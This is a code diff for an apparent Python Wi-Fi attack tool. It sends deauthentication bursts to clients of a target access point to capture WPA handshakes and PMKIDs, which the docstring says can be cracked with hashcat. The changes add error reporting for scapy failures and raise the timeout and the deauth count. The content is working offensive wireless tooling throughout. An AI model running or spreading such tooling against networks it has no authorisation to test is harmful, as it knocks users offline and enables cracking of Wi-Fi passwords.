@@ -33,13 +33,15 @@ def analyze_capture(pcap_path):
       - a half handshake (>=2 EAPOL frames — still crackable by hashcat)
       - a PMKID (carried in the AP's first EAPOL frame; no client needed)
     """
-    result = {"eapol": 0, "pmkid": False, "handshake": False}
+    result = {"eapol": 0, "pmkid": False, "handshake": False, "error": None}
     try:
         from scapy.all import rdpcap, EAPOL  # type: ignore
         packets = rdpcap(pcap_path)
-    except BaseException:
+    except BaseException as e:
         # scapy can raise low-level (non-Exception) errors on some installs;
-        # never let handshake inspection crash the capture loop.
+        # never let handshake inspection crash the capture loop. Surface the
+        # error so a broken scapy isn't mistaken for "no handshake captured".
+        result["error"] = str(e) or e.__class__.__name__
         return result
 
     for pkt in packets:
@@ -92,7 +94,7 @@ def _clients_for_bssid(csv_path, bssid):
 
 
 def start_capture(monitor_iface, bssid, channel, essid, output_dir="pcaps/",
-                  timeout=90, deauth_count=5):
+                  timeout=180, deauth_count=8):
     """
     Capture WPA handshake material for one target, pwnagotchi-style:
 
@@ -138,7 +140,6 @@ def start_capture(monitor_iface, bssid, channel, essid, output_dir="pcaps/",
 
             # Discover associated clients and deauth them specifically.
             clients = _clients_for_bssid(csv_path, bssid)
-            new_clients = clients - seen_clients
             for client in clients:
                 deauth_mod.deauth_burst(monitor_iface, bssid, client=client,
                                         count=deauth_count)
@@ -149,11 +150,16 @@ def start_capture(monitor_iface, bssid, channel, essid, output_dir="pcaps/",
                 deauth_mod.deauth_burst(monitor_iface, bssid, count=deauth_count)
 
             status = analyze_capture(cap_path) if os.path.exists(cap_path) else \
-                {"eapol": 0, "pmkid": False, "handshake": False}
+                {"eapol": 0, "pmkid": False, "handshake": False, "error": None}
             rprint(
                 f"[cyan][*] ({mins}:{secs:02d}) clients={len(seen_clients)} "
                 f"eapol={status['eapol']} pmkid={status['pmkid']}[/cyan]"
             )
+            if status.get("error"):
+                rprint(
+                    f"[yellow][-] pcap inspection error (scapy): {status['error']}. "
+                    f"EAPOL count may be wrong — check {cap_path} manually.[/yellow]"
+                )
 
             if status["handshake"]:
                 success = True
